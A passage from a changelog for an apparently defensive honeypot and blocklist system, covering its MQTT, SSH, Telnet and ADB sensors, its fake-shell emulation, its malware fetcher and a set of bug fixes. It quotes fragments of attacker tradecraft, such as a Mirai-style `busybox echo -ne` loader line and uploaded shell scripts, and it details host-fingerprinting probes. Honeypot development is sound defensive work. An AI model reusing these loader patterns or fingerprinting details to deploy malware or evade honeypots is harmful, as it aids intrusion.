  with CONNACK reason `0x84`, so a strict 5.0 scanner stopped at CONNECT and none of its
  SUBSCRIBE or PUBLISH recon was captured. It now speaks 5.0 in full: CONNECT (with its will
  properties), PUBLISH, SUBSCRIBE, UNSUBSCRIBE, PUBREL and AUTH are parsed and answered in 5.0 wire
  form, and 3.1 and 3.1.1 behave as before. A properties block is parsed strictly inside its
  declared length (at most 64 properties, no panic on any input), so a malformed property sets
  `properties_parse_error` but can neither corrupt the packet boundary nor fail the packet. The
  recon-relevant properties are logged (session expiry, receive and packet-size maxima, topic alias
  and its maximum, request-response-information, the authentication-method name, and the first 16
  user properties with a full count); Authentication-Data is a credential and, like the password,
  is never stored or logged. Also new: a connection whose first packet is malformed or not a
  CONNECT now emits a second `honeypot_connection` event (`malformed`, a `reason`, a bounded hex
  snippet) instead of closing silently; every connection ends with a `honeypot_session_end`
  summary (packets, publishes, subscribes, bytes, duration, client id); and the idle wait after
  CONNECT is bounded by 1.5 times the client keepalive.
- **MQTT honeypot sensor (`sensor-mqtt`, default-off)** - a recon trap for TCP/1883 that records
  MQTT CONNECT credentials (never the password), SUBSCRIBE topics and PUBLISH topic and payload
  metadata (length, a bounded preview, a SHA-256), and answers just enough of the protocol that a
  client carries on. It never delivers, retains or forwards a message, opens no outbound
  connection and executes nothing; a binary PUBLISH payload is quarantined, never run (see the
  entries above). The parser caps a packet at 256 KiB of declared length, a connection at 1024
  packets and the configured byte budget, and refuses a malformed or oversize packet by closing
  the connection. The sensor is off until `PROPOLIS_MQTT_BIND` is set, and its unit grants no
  `CAP_NET_BIND_SERVICE` (1883 is unprivileged).
- **Fake shell: a real grammar and faithful command modeling** - the shell the SSH, Telnet and ADB
  sensors present now lexes, parses and evaluates a shell-command subset (quotes, expansions,
  arithmetic, real pipelines, `&&`/`||`, subshells and `if`/`for`/`while`) instead of matching whole
  lines, dispatches every command through a shared registry, and bounds each connection with a shared
  resource budget (overlay bytes and nodes, command and download events, wire egress, per-line work
  and a recursion depth cap). The filesystem is a node model over a persona snapshot with symlinks,
  devices, modes and mount flags. The commands the highest-volume observed attacker chains use now
  answer faithfully: reading the ELF header of `/bin/ls` (`cat | head`, `hexdump -n 52`, `dd bs=52`)
  and of `/proc/self/exe` (resolved to the executable of the reading process, so the `|| cat`
  fallback is suppressed), the Telnet `.fxcat` writable-directory sweep, and the real
  BusyBox v1.30.1 multi-call banner and its 263-applet set. Shell identity (bash login versus a
  `bash -c` exec versus nested `su`/`sh`/dash levels versus Android mksh) drives every prompt, error
  prefix and `$0`. A per-line internal trace records why the shell answered as it did and can never
  reach the wire, and the never-exec and no-fetch guarantees hold by construction: the emulator has
  no process, evaluation or network facility and the synthetic binary bytes are generated, never a
  host file read or run. Attacker-facing behavior is checked by a byte-for-byte session-replay corpus.
- **Protocol-correct shell transports** - SSH now tracks up to ten independent channels, obeys each
  peer's receive window and maximum packet size, replenishes its own receive window, separates
  non-PTY stderr, and completes exec channels with exit status, EOF and close. ADB obeys negotiated
  maxdata and waits for an OKAY before each subsequent WRTE, including large one-shot replies.
  Telnet routes banner, prompts, echo and command output through one NVT encoder that applies ONLCR,
  the session XOR codec and IAC escaping in wire order. Writes on all three transports are bounded
  by the connection idle timeout.
- **Split deployment: collectors ship to a gateway over mTLS** - a honeypot collector no longer
  needs database access. `shipper` tails each sensor's log through the shared `log-tailer` crate and
  ships length-prefixed batches to a `gateway` over mutually authenticated TLS. The gateway verifies
  a per-collector sequence number and rolling hash against durable state, spools accepted records as
  byte-exact sensor NDJSON for intake, and acknowledges; the shipper advances its cursor only on
  that acknowledgement. Frame, acknowledgement and mTLS config live in a shared `collector-wire`
  crate so the two ends cannot drift.
- **Certificate minting for a split deployment** - `provision-certs` mints the CA, gateway and
  collector certificates the mTLS transport needs. Bootstrap only: addition, rotation and revocation
  are not implemented.
- **Operator runbook for the split deployment** - `docs/operations/split-deployment.md` covers
  creating the certificates, setting up both hosts by hand (no script creates the gateway's or the
  shipper's users, directories or units), checking the path end to end, and upgrading, rotating,
  rebuilding, backing up and troubleshooting it, with the limits the split still has. Its commands
  and claims were checked against the code by independent reviewers, and the chain behaviour it
  describes (the reset procedure, a one-sided reset, a foreign CA, a blank log line) was run on
  loopback with the release binaries.
- **Malware fetcher** - retrieves the payload behind a URL a captured dropper points at, under
  deliberately paranoid egress rules: scheme allowlist, URL vetting, IP pinning, an egress deny-set
  that canonicalizes mapped/NAT64/6to4 forms, per-hop redirect re-vetting performed by hand rather
  than by the HTTP client, a byte cap on the streamed response, and peer-pinned TFTP for the RRQ
  case. Embedded URLs are extracted from dropper scripts, including Script-Encoded (`.vbe`) ones.
  Attempts and their outcomes are recorded in `fetch_attempt` and shown on the IP detail page.
- **Listener reachability pane** - the console names every declared listener and what has actually
  been proven about it, from a sweep that dials each one from the control plane. The sweep's own
  connections are filtered at intake, so answering the reachability question cannot score the node
  into its own blocklist. Off by default (`PROPOLIS_FLEET_PROBE_ENABLED`), and it refuses to start
  without the source addresses that filter needs.
- **Deploy identity** - `deploy-stamp.sh` records what a deploy actually left on disk, and the
  console compares four identities usually collapsed into one: what this process runs, what the
  deploy installed, what was checked out, and what `main` held at the last fetch. Idempotent
  provisioning moved into `provision.sh`.
- **Per-occurrence and per-capture identity** - sensors mint an `occurrence_id` at the emit
  chokepoint and a `capture_id` at the spool chokepoint, and write a durable per-capture outbox
  manifest, so a captured sample can be tied back to the event that produced it. Both fields are
  additive on the sensor wire.
- **Volume-based blocklisting** - a high-volume connection flood is recommended for the blocklist on
  volume alone, since same-signal dedup otherwise collapses a flood into a single scored event. It
  counts only completed-TCP events, never spoofable datagrams, and volume-listed addresses publish
  into the retention windows rather than the tiered files.
- **Per-subsystem liveness** - the supervisor publishes each subsystem's state, `/ready` answers 503
  once one has given up, and the ops-monitor pages on it.
- **Forward-confirmed reverse DNS** on the IP-detail page (`PROPOLIS_CONSOLE_RDNS_ENABLED`, default
  off - the one outbound lookup in the console's enrichment). A shown hostname is forward-confirmed
  (PTR must resolve back to the IP) and marked verified/unverified; display-only, never a suppression
  signal. On-demand, cached, system resolver via libc (no async DNS dependency).

- **Trusted-org ASN suppression** - an optional `PROPOLIS_FEED_ASN_ALLOWLIST` keeps a trusted
  organization's own infrastructure or a known scanner (by AS number) off every published feed,
  keyed off the offline GeoLite2-ASN database. ASN ownership is not per-IP spoofable, unlike reverse
  DNS. Empty (opt-in) by default. The GeoLite2 reader is now a shared `geoip` crate used by both the
  console and the feed.
- **IP detail: network profile** - a "Services probed" panel (what each address did to us, grouped
  by sensor, with per-service auth state and activity window) and a "Network profile" panel with
  egress-free operator lookup links (Shodan, GreyNoise, AbuseIPDB, VirusTotal) plus optional offline
  MaxMind GeoLite2 geo/ASN enrichment via `PROPOLIS_GEOIP_DIR` (read locally, never queried over the
  network; degrades to "not configured" when the databases are absent).
- **Telnet XOR de-obfuscation** - the fake shell recovers single-byte-XOR-obfuscated command probes
  (e.g. the LZRD Mirai variant) so it responds in-persona, recording both the raw wire bytes and the
  decoded command; the console shows a "de-obfuscated (xor 0xNN)" badge.
- **Operational self-alerting** - a supervised `ops-monitor` polling intake, sensor heartbeat, DB/
  spool capacity, feed freshness, vendor health, and hash-chain integrity, paging over ntfy
  (opt-in via `PROPOLIS_OPS_ENABLED`).

- **SP8: 7 new honeypot sensors** - telnet, redis, adb, http, ftp, smtp, and credential
  multi-protocol (VNC/MySQL/MSSQL/PostgreSQL/MongoDB). Each runs as a dedicated hardened systemd
  service. 251 tests across the 7 crates.
- **SP7: unified daemon** (`propolis`) - composes intake, review, feed, and console as supervised
  tokio tasks sharing one PgPool. Hardened systemd unit and idempotent install script.
- **SP6: web console** - operator dashboard with review queue, IP detail, feed status, metrics,
  and rate-limited login.
- **SP5: blocklist feed** - two-tier export (aggressive/standard) with anti-deanonymization
  coarsening, fail-closed publisher.
- **SP4: review queue and reporting** - human-approval gate, per-vendor submission gatekeeper,
  AbuseIPDB/DShield/OTX vendor adapters.
- **SP3: event intake** - sensor log tailer with durable cursor, rotation-aware, direct-PG
  aggregation.
- **SP2: sensor framework + SSH** - shared sensor harness (TCP/UDP listener, EventEmitter,
  CaptureHandoff, QuarantineSpool, WanResolver, FakeFs, FakeShell), catch-all port-scan sensor,
  SSH honeypot with vendored crypto. Wire contract frozen.
- **SP1: core scoring layer** - domain model, PostgreSQL schema, append-only hash-chained event
  ledger, time-decayed scoring projection, eligibility/weight/recommendation gates, multi-WAN
  breadth model. 60 tests against real PostgreSQL.

### Fixed

- **A host survey gets the answers an Ubuntu 22.04 server gives (T9)** - a fingerprinting
  script run twice against the fleet on 2026-10-07 (45 commands: `nproc`, `/proc/cpuinfo`,
  `top -bn1 | grep '^%Cpu'`, `free | grep -i '^Mem:' | awk ...`, `cut`, `ip addr`, `which apt`,
  `time dd ...`) got empty or `command not found` answers no real host gives. Every new format
  below was recorded the same day from a systemd-booted `ubuntu:22.04` reference (grep 3.7,
  coreutils 8.32, mawk 1.3.4 20200120); a format that could not be recorded is marked
  `[unverified]` where it is written. `grep` matches basic, extended and fixed patterns (it
  printed nothing for anything but `-F`) through a new linear-time POSIX matcher
  (`shell/regex.rs`) with GNU's options, context lines and compile errors; `cut`, `tee` and
  `awk`/`mawk` (an interpreter for the language, whose `system()` and command pipes run through
  the fake shell itself) are new; `od -c` is modeled. `tee` and `mawk` join the recorded binary
  table, and `/usr/bin/awk` is the alternatives link to `mawk` as on the reference. bash's
  `time [-p]` keyword reports in bash 5.1's format on the shell's stderr from the time the timed
  commands claim (`sleep`'s interval, `dd`'s own elapsed figure, a fixed per-process cost), so
  `time dd` agrees with dd's summary; `history` lists the interactive shell's lines and nothing
  under `bash -c`. `dd if=/dev/zero of=FILE` writes its zeros as an O(1) fill (the survey's 10 MB
  probe answered `File too large`), and dd's byte-count sizes keep a decimal below 10 only
  (`(10 MB, 10 MiB)`, it printed `(10.5 MB, 10.0 MiB)`). The host itself is one model the
  commands agree on: the process table holds a 22.04 server's kernel threads and services
  (journald, resolved, networkd, cron, dbus, rsyslogd, logind, the getty pair, the session's
  `systemd --user`) with their real owners, so `ps aux`, `top -bn1`, `pgrep`, `/proc/PID` and
  `/proc/loadavg` (now present, as is a ticking `/proc/uptime`) count the same rows; `ss` lists
  resolved's stub on 127.0.0.53 beside sshd in iproute2 5.15's recorded layout, and
  `/proc/net/udp` the same socket. `/proc/cpuinfo` lists every field (the `model name` grep was
  empty), `/etc/shadow`, `/etc/gshadow`, `/etc/group` and the installer's netplan file exist
  (root's hash is a random yescrypt-shaped string that hashes no password), root's dotfiles
  are the stock ones, the root disk is `/dev/root` on the Xen `xvda` the CPU implies, `/tmp` is
  sticky and `/proc`/`/sys` read-only, and `/lib32`/`/libx32` join the usrmerge links. An SSH
  session's environment carries `SSH_CLIENT`, `SSH_CONNECTION`, `LANG`, `SHLVL`, the `XDG_*`
  set and, interactively, `SSH_TTY`, `TERM` and `LS_COLORS`, in bash's own hash order (`env` printed
  four variables); `MAIL` is set over telnet only, because a jammy SSH login has none (recorded).
  `ls -a` lists `.` and `..` and the short listing is one name a line off a terminal, a file
  the session writes is dated now rather than 2024, and `uname -a` and `/proc/version` carry the
  kernel's build date [unverified]. `systemctl`, `crontab`, `apt`/`apt-get`/`dpkg`, `ssh`,
  `lspci`, `lshw`, `who` and `w` exist (`which apt` and `ssh -V` answered nothing):
  `systemctl list-units --state=running` lists the services whose processes `ps` shows, `status`
  reads their PID and memory from the same rows, and enabling is the `.wants` symlink the
  filesystem holds, so a dropped `kworker.service` is linked with systemd's own `Created
  symlink` message and never started. `crontab` keeps its table in cron's spool with Debian's
  header and errors. One package table recorded from a 22.04 server install answers `dpkg -l`,
  `dpkg -s` and `apt list`, with `openssh-*` at the banner's version; `apt install` of anything
  not installed cannot be located and nothing is fetched. `ping` prints iputils' report of
  replies it never sent (it printed BusyBox's layout on Ubuntu) and fails names the box cannot
  resolve as `getent` does; `ssh` times out on connect. A file the session writes now runs as
  itself whatever its name (`/tmp/w` used to run `w`), and a copy of a modeled binary runs as
  that binary; `ls -d` lists a directory operand itself. At an interactive terminal (SSH with a
  pty, telnet, ADB) `read x` and `head -n 1` answer when Enter hands them their line, where they
  waited for Ctrl-D: each Enter reruns the waiting line on the input so far (at most 64 times, on
  at most 64 KiB) and keeps the run only if nothing still wants more, so `cat > f` still reads to
  Ctrl-D and what is typed after a finished `read` is the next command. An SSH shell without a pty
  reads a pipe as bash does: a bare `sh` reads the rest of the input as its script (it opened a
  nested interactive level), there is no prompt, history or terminal variable, and the client's
  EOF ends the shell with the last command's status (the session used to stay open).
- **Console labels** - protocols read `TCP` / `UDP` instead of the enum names `Tcp` / `Udp`; the
  feed status tab's build and valid-until times use the console's `YYYY-MM-DD HH:MM UTC` form
  instead of raw RFC 3339; credential-sensor listeners read as their service (`VNC`, `MySQL`,
  ...) instead of `Cred-vnc`; IP-page sessions ending in the same minute keep their real order.
- **An intake that fell behind no longer slowed down because it was behind** - the dedup read
  every scored append makes inside the global append lock (the newest prior observation of one
  source and signal) had no index of its own, so the planner walked `event_observed_at_idx` down
  from the newest row until it met the source: one row per event newer than that source's last
  sighting. A lagging intake appends old `observed_at` values, so the walk grew with the lag and
  the lag with the walk. A telnet stream from a bot loop ran at about one event a second for days
  and, holding the append lock that long, held up every other sensor. Migration `0013` adds
  `event_dedup_idx (source_ip, signal_type, observed_at)`, and the read passes the address through
  a scalar subquery so the planner costs a hot source like any other: with the index alone it
  still chose the walk for the two hottest sources of a test ledger. On a 7.5M-row ledger with
  telnet 11 days behind the read went from 840 to 1060 ms to about 0.13 ms for those sources,
  and the lagged append of a 100k-row source from 1.7 s to 0.69 s, its cost when caught up; the
  rest is the per-event history aggregates, which are still to be made incremental. The index is
  built inside the migration transaction at startup, before intake runs: 12 to 20 s for that
  ledger held in RAM, longer on disk. Plan guards hold the read to the index on a ledger shaped
  like the incident.
- **An append no longer costs more the longer its source has been seen** - every scored append
  counted the source's distinct WAN vantages and distinct sensors by reading every earlier event
  of that source (a `GROUP BY wan_ip` and a `COUNT(DISTINCT sensor)`), inside the global append
  lock. On a 7.5M-row ledger that was 0.73 s per event for a source with 100k events, 3.5 s at
  200k, 7.1 s at 800k and 9.4 s at 1.5M, and a long-running bot loop on one address set the pace
  for every sensor: three fresh sources appending beside a 1.5M-event one managed about one
  event a second between them. Migration `0014` adds two projection tables, `ip_vantage
  (source_ip, wan_ip, saw_authenticated_tcp)` and `ip_sensor (source_ip, sensor)`, which the
  append folds each scored event into under the same lock and reads by primary key; telemetry
  never writes them. The same appends now take 2.8 to 3.3 ms whatever the history, against 3.1
  ms for a source never seen, and the four mixed sources together reach 358 events a second.
  The migration backfills both tables from the ledger at startup, before intake runs: 23 to 26 s
  for that ledger held in RAM, longer on disk. `rebuild_projection` still counts from the ledger
  rows, so a replay checks the tables; a property test compares the tables with the old
  aggregates after every append of random multi-source sequences with telemetry and
  out-of-order events.
- **`echo` and `printf` escapes write the bytes they name** - `\xNN` and octal escapes from
  0x80 to 0xff came out as the UTF-8 encoding of that code point (two bytes), so a Mirai/Mozi
  echo loader that assembles its downloader as `busybox echo -ne '\x7f\x45...' >> .i` chunks
  left a file that was not the one it sent. Both now produce one raw byte per escape, and an
  octal escape past 0xff keeps its low eight bits. `busybox wget` with no URL prints BusyBox
  1.30.1's wget usage on stderr and exits 1 (it printed a download transcript for an empty URL),
  and dash answers a path that does not exist with `sh: N: ./x: not found`, as its `errmsg`
  does, instead of bash's `No such file or directory`.
- **`upgrade.sh` no longer finishes an upgrade with the copy of itself it started from** - bash
  reads a script as it runs, so after `git pull` replaced `deploy/upgrade.sh` the rest of the
  upgrade ran the old text: a release that added `propolis-watch` to the binary list built it
  and then installed from the list without it, leaving `/usr/local/bin/propolis-watch` missing.
  When the pull changes the script, `upgrade.sh` now re-executes the new one with
  `PROPOLIS_UPGRADE_REEXEC=1`, which makes that run skip the pull (it cannot loop) and carries
  the first run's pull timestamp in `PROPOLIS_UPGRADE_PULLED_AT`, so the deploy stamp still
  records when the pull happened. The binary install now checks each built binary exists
  before installing it and, afterwards, that every listed binary is present in
  `/usr/local/bin` before anything is stamped or restarted (`install.sh` does the same check
  after its install). Both scripts keep the list in one `INSTALL_BINS` array, and a new test
  compares it with the workspace's binary targets, so a binary added to the workspace but not
  to the lists fails the build.
- **The live-watch documentation no longer sends the reader to the honeypot's SSH sensor** -
  its examples connected to port 22, which on a honeypot host is usually `sensor-ssh`; one
  attempt landed in the fake shell. Every example now names the real sshd with
  `-p <admin-port>`, `docs/operations/live-watch.md` warns against the sensor's listener and
  shows `sudo ss -ltnp | grep sshd` to find the real port, and notes that a passphrase-protected
  key needs `ssh-add` for unattended use.
- **A command's standard input reaches it, and is captured** - an SSH exec ran at the request
  and closed the channel, so the payload a bot streamed after `cat > astats` or `cat > w.sh`
  hit a closed channel: the file stayed empty, nothing was captured, and the bot retried and
  left. The fake shell now decides, by running the line against its own model of the commands
  and rolling back what that run did (`FakeShell::start_line`), whether a line reads its input
  (`cat`, `cat > f`, `dd` without `if=`, `base64 -d`, `head`, `read`, a bare `sh` on a pipe,
  the same inside `sh -c`, a group or a pipeline). Such an SSH exec is held with the channel
  open until the client's EOF (or CLOSE, the idle timeout, `max_captured_bytes`, the session's
  end) and then runs once on the input, followed by its output, exit status, EOF and CLOSE; a
  command that reads no input still completes at the request. At the SSH, telnet and ADB
  shells a typed `cat > f` takes the lines after it until Ctrl-D, as a terminal does (Ctrl-C
  kills it, status 130), and an ADB `shell:<command>` that reads input holds its stream until
  the client closes it. Every consumed body, text or binary, becomes one
  `honeypot_malware_upload` per distinct SHA-256 per session, with `capture_reason`
  `exec_stdin` or `shell_stdin`, the `command`, the `destination` file and a `repeat_count`
  for retried uploads; those bytes are no longer also offered to the binary-payload shell
  capture. `ls` now lists a file operand (it said `No such file` for a file `wc` read) and has
  a `-l` long listing from the facts `stat` prints, and `sh -lc`/`bash -ec` find their
  clustered `-c` script instead of running the script text as a file name.
- **Every captured upload records why it ended** - the fleet pane's capture panel gave
  `unrecorded` as the end reason of incomplete captures (ten of ten for SSH), because
  `upload_metadata` took only a `complete` flag and `end_reason` was added by hand at the three
  shell-capture sites. SCP, SFTP, ADB sync, FTP STOR, TFTP WRQ and MQTT PUBLISH captures never
  carried it. `upload_metadata` now takes a required `UploadEnd` and writes both `complete` and
  `end_reason` from it, so neither can be omitted or disagree. A finished transfer reads
  `transfer_complete`; a transfer cut off before its end of file carries what cut it
  (`peer_closed`, `client_logout`, `idle_timeout`, `session_cancelled`, `transport_error`,
  `malformed_input`, `capture_budget`, and for a TFTP peer ERROR the new `peer_aborted`) with
  `complete` false, even where the same label makes a shell capture complete. SSH passes each open
  SCP or SFTP transfer the session's real ending, or `peer_closed` when its channel is closed; an
  ADB sync stream the client closes records `peer_closed`; FTP records an idle data connection as
  `idle_timeout` and a failed one as `transport_error`. The shell-capture labels are unchanged.
  Events already stored keep no `end_reason` and still read `unrecorded`; nothing is backfilled.
- **The IP detail page shows a catch-all probe's port** - the evidence row read
  `metadata.port`, which no sensor has ever written, so every catch-all probe showed `-`. It now
  reads the stamped `metadata.local_port`.
- **The fleet pane counts each listener, not each sensor** - LAST EVENT and 24H are per listener
  row, but the query grouped by sensor, so every port of a sensor showed the sensor's total (two
  Redis ports with the same count, HTTP 80 and 443 alike, every catch-all row identical). Activity
  is now keyed by sensor, `protocol` and the new `metadata.local_port`. The query also aggregated
  the whole event ledger on every load and 30-second refresh; it now reads the last 24 hours for
  the count and the 30 days before that for LAST EVENT, both ranges on `observed_at`. A listener
  with nothing in those 30 days reads `none in 30d` instead of `never`, which the page can no
  longer prove. Events recorded before the upgrade have no port: they count on the sensor's row
  when it declares exactly one listener, and otherwise on one `port not recorded` row per sensor,
  which is not a listener and ages out after 30 days. A port present in the ledger but missing
  from `PROPOLIS_FLEET_LISTENERS` gets its own `undeclared listener` row.
- **`propolis` stops in at most 37 s, and the journal names a subsystem that would not stop** -
  after the shutdown signal the daemon waited 30 s for its subsystems, logged "shutdown timed
  out", then called `pool.close()`, which waits for every checked-out connection to be returned.
  A subsystem that ignored cancellation was never aborted (and aborting the supervisor task
  would have left the task under it running), so it kept its connection, `pool.close()` never
  returned, and `systemctl restart propolis` (and so `deploy/upgrade.sh`) sat until systemd's 90 s
  stop timeout SIGKILLed the process. Shutdown now aborts every subsystem still running after
  the 30 s grace (including the task beneath a supervised subsystem and the children of a
  supervised group), allows 2 s for them to unwind, bounds `pool.close()` at 5 s, and logs
  `propolis: shutdown timed out waiting for: <names>; aborted`. A build-time assertion keeps the
  total under systemd's default stop timeout.
- **`deploy/sensor.env.example` lists the real `sensor-catchall` defaults** - the example block
  showed the shell sensors' bounds (30000 ms read, 60000 ms idle, 600 s duration, 1000000 bytes)
  and the deprecated bare `CATCHALL_MAX_CONCURRENT` name. The sensor's compiled defaults are 5000
  ms, 5000 ms, 30 s and 4096 bytes (`crates/sensor-catchall/src/main.rs`), and the block now says
  so, uses the `PROPOLIS_` name throughout, and notes that the compiled default log path is
  relative.
- **A non-UTF-8 environment variable is a startup error in every sensor, never read as unset** -
  most sensor variables were read with `env::var(..).ok()` or `if let Ok(..)`, so a value that was
  not valid UTF-8 silently fell back to the default or skipped the work: a bound or a timeout
  reverted to its default, a log path or collector id was replaced, and `sensor-cred` skipped a
  protocol's `PROPOLIS_CRED_*_BIND` listener the fleet inventory still claimed. All eleven sensors
  (and the collector id read in `shipper`) now read every variable through
  `sensor_framework::strict_env_var` (renamed from `tls_env_var`, with its error type
  `EnvError`, and moved from `tls.rs` to `env.rs`; no alias is kept), which exits 1 before any
  bind with `environment variable <NAME> is not valid UTF-8`. `env_with_legacy` now applies the
  same rule to both spellings. Side effects of the shared reader on valid UTF-8: a value is
  trimmed of ASCII whitespace (a numeric bound written with a stray space now parses), and a
  value blank after the trim counts as unset: an optional variable falls back to its default
  where it used to error or be used as an empty string (a blank `PROPOLIS_CRED_*_BIND` now skips
  that protocol, a blank `PROPOLIS_SSH_BANNER` or collector id takes the default), and a blank
  required bind is still a startup error.
- **`sensor-ftp` treats `pasv` and `nlst` like their uppercase forms** - the PASV/EPSV and
  LIST/NLST replies were chosen by a case-sensitive comparison, so lowercase `pasv` got the EPSV
  style `229` reply and lowercase `nlst` got the long LIST output. Every other verb was already
  case-insensitive. The TLS reset, data-peer and bind-failure guards that were correct but
  unguarded by tests now each have a test.
- **A malformed PEM error never carries key bytes** - the PEM parser's own error prints the
  offending line or section label as a byte list, and for a key written header, body and footer on
  one line that label is the whole key, which every TLS sensor then logged at error level. The
  error now names the file and a fixed description of the fault (for example
  `missing section end marker`) for both the certificate and the key file, and keeps no parser
  error in its source chain.
- **Sensors log at `info` by default** - every sensor called `tracing_subscriber::fmt::init()`,
  whose default is `error` once a workspace build unifies the `env-filter` feature in, so a
  deployed sensor logged no listening lines and no warnings. All eleven now default to `info`, and
  `RUST_LOG` still overrides it, however the binary is built.
- **Sensor TLS finalize** - a TLS variable (or sensor-smtp's submission bind) holding a non-UTF-8
  value is now invalid on every TLS sensor, and the sensor exits 1 before any bind. sensor-ftp and
  sensor-smtp read such a value as unset, which silently skipped the 990, 465 or 587 listener or
  turned TLS off; http, redis and mqtt converted it lossily. The six TLS units grant the TLS
  directory as `ReadOnlyPaths=-/etc/propolis/tls`, so a host without `/etc/propolis/tls` no longer
  fails every one of those units with `226/NAMESPACE`, TLS used or not; a configured pair that
  cannot be read still refuses to start. A deploy test now holds the units carrying that line
  equal to the sensors `provision-tls.sh` mints for. `deploy/sensor.env.example` showed
  sensor-cred's `MAX_DURATION_SECS` and `MAX_CAPTURED_BYTES` defaults as 600 and 1000000; the code
  defaults are 60 and 100000. The component inventory still called sensor-mqtt metadata-only
  with MQTT 5.0 declined, and the troubleshooting page said sensors terminate no TLS. The
  networking and TLS guide is reorganized around one table of every TLS surface.
- **Split-deployment examples and references match the code** - the example env files named
  certificate files `provision-certs` never writes and called every one 0600, described the
  gateway address as `host:port` (only a literal IP and port is accepted), called the client
  certificate revocable (nothing revokes one), and gave a re-provisioning recipe for more
  collectors that the tool cannot carry out. The environment variable reference said the sensors
  log at `info` without `RUST_LOG`; they then logged only errors (the sensors now default to
  `info`, see above), and every binary except `propolis`, `console` and the sensors still does.
  The gateway unit suggested a capability grant for a port below 1024 that `PrivateUsers=yes`
  makes useless. These, the reference's gateway and shipper tables, and the backup, upgrade and
  compatibility pages are corrected.
- **Evidence is no longer lost when a log rotates mid-batch** - the tailer recorded a displaced
  inode's rewind offset as the cursor's live position, which was already past whatever the
  uncommitted batch had read from that inode. A rewind then resumed beyond those lines, so they
  were handed out, never committed, and never re-read - contradicting `rewind_batch`'s contract of
  putting back every read since the last commit.
- **The published feed survives a failed or interrupted swap** - publishing moves the live
  directory aside and then moves staging into its place. A failed second rename left the public
  path absent with no rollback, and a crash between the two renames left it absent until some later
  build happened to succeed. The failure case now rolls the previous build straight back, and
  `recover_interrupted_publish` restores a parked build at daemon startup and at the head of every
  publish - before the new snapshot is re-validated or staged, so a build that is rejected or
  cannot stage costs that build and not the availability of the feed already published.
- **OTX indicators carry their real address family** - the pulse payload declared every indicator
  `IPv4` while reports accept either family, so an IPv6 address was submitted mislabelled against
  an API that validates the value against its declared type.
- **A polled page survives the session expiring underneath it** - protected routes answered an
  HTMX request with a 303 to `/login`. The XHR followed it, `/login` returned 200 with a whole HTML
  document, and HTMX swapped that document into the container that issued the poll - leaving
  `<html>`, `<head>`, a password field and a second copy of every vendored script nested inside a
  `<div>`, with nothing about it looking like an error. Sessions are in-memory and a restart clears
  them, so this happened after every upgrade on any page left open. HTMX requests now get a 401
  with `HX-Redirect` and no swappable body.
- **The fleet page no longer reports what it did not measure** - the headline was chosen from the
  combined severity of the reachability and event-age checks, so a fully probed and confirmed fleet
  with one quiet listener read as "evidence path unconfirmed". A failed capture query rendered as
  "no malware captures", and a failed event count as `0 events`. A failed refresh left the previous
  reading on screen with server-computed ages that never moved again; a stalled panel now says how
  long ago its numbers were actually measured. A poll that is accepted and then never answered
  raises no error event at all, and HTMX's default request timeout is unlimited, so the panel is
  bounded by a real request timeout AND aged on its own clock rather than waiting for an event that
  may never come. A failed end-reason query no longer renders as "nothing incomplete" beside a row
  that is counting incomplete captures.
- **Queue decisions are all-or-nothing** - delist, relist and delete-ip each issued two or three
  autocommit statements, so a failure part-way left an address half changed (a queue row dropped
  with the feed latch kept, `delisted` cleared without the gates recomputed, vendor rows deleted
  while the score row survived). Each now runs in one transaction.
- **Upgrades build what CI tested** - `upgrade.sh` built with a bare `cargo build --release`, which
  could resolve a dependency graph CI never ran and relied on default members covering every
  installed binary. It now builds with `--workspace --locked`, as the CI release job does.
- **The backup stores each sample once and restores owners by name** - the documented archive named
  the fetched-sample directory and its parent, so every fetched sample was stored and restored
  twice, and `--numeric-owner` recorded only numbers, which a rebuilt host whose service users got
  different UIDs would hand to the wrong accounts. Restore now runs `provision.sh` before
  extracting. `crates/propolis/tests/restore_rehearsal.rs` (ignored by default; it needs PostgreSQL
  server binaries) restores a populated backup into a fresh cluster and checks the ledger, its
  grants and sequences, and the spooled samples.
- **The docs state the tree they describe** - current pages said 18 crates at `0.3.0`, 15 binaries
  and 1165 tests against a tree of 24 crates, 17 binaries and over 1600 tests, and the component
  inventory lacked six crates. The docs agreement test now recomputes the version, crate, member and
  binary totals, the component inventory and dependency graph, the test taxonomy and the migration
  list from `cargo metadata` and the source, and fails when a current page disagrees.
- **Code citations point at the code again** - the docs cited code by `path:line`, and about 450
  citations had drifted as the cited files changed, including every directory citation into
  `install.sh` after provisioning moved to `provision.sh`. All were re-read against the current
  source and sentences the code had outgrown were rewritten. Every citation now names a symbol
  instead of a line (`crates/sensor-framework/src/spool.rs#store`), which an edit elsewhere in the
  file cannot move. The docs agreement test fails on a line citation in any form, and on a
  `path#symbol` whose file is gone or no longer contains the symbol.
- **Two stores of the same sample at once both succeed** - the spool wrote a body straight to its
  digest name, so a second store of the same bytes during that write (the malware fetcher runs
  several fetches at once, and two URLs can serve one payload) re-hashed the half-written file
  and failed it as corrupt, recording a failed fetch. A body is now written to a staging file,
  synced, and given its name with a hard link, which never replaces an existing name, so a
  digest name only ever holds a complete body. Staged files a stopped process left behind are
  removed at the next start.
- **Smaller console hardening** - the reverse-DNS cache holds at most 4096 entries, sweeping expired
  ones and evicting the oldest; search refuses a control character or a value over 512 bytes with
  400 instead of passing it to PostgreSQL.

### Changed

- **One reading rule for every sensor TLS variable** - all six TLS sensors read each
  `*_TLS_BIND`, `*_TLS_CERT`, `*_TLS_KEY` and `PROPOLIS_SMTP_SUBMISSION_BIND` the same way: the
  value is trimmed of ASCII whitespace and a blank one counts as unset, as
  `deploy/fleet-listeners.sh` already treated a blank bind. Until now a blank TLS bind made http,
  redis and mqtt exit 1 as an invalid address, a blank cert or key made sensor-cred exit 1, and
  smtp and ftp did not trim paths. A non-UTF-8 value is still invalid.
- **One bind-failure message** - a listener that fails to start after its configuration validated
  is logged by every sensor as
  `<sensor>: cannot start listener on <ip:port>: <OS error>; refusing to start` (catchall and cred,
  which skip one failed address, end that line `; skipping ...` and refuse only when every address
  failed). The behavior is unchanged.
- **A snooze can be finished and a delist undone** - the Snoozed tab had no decision controls and
  nothing re-surfaces a decided entry, so deferring a decision quietly meant never making one; the
  history tabs also rendered rows with an empty CSRF token. The tab now carries Approve, Reject and
  Return to pending. `POST /ip/{ip}/relist` undoes a delist by clearing the latch and re-deriving
  the gates, so an address rejoins the feed on its current merit rather than because it was once
  listed. Also `review unsnooze` and `review snoozed` on the CLI.

### Security

Remediation of an external audit (findings P-01 to P-15). Upgrading applies review migrations
`0006` and `0007`.

- **Spool reads no longer follow links** - the console's sample download and the VirusTotal
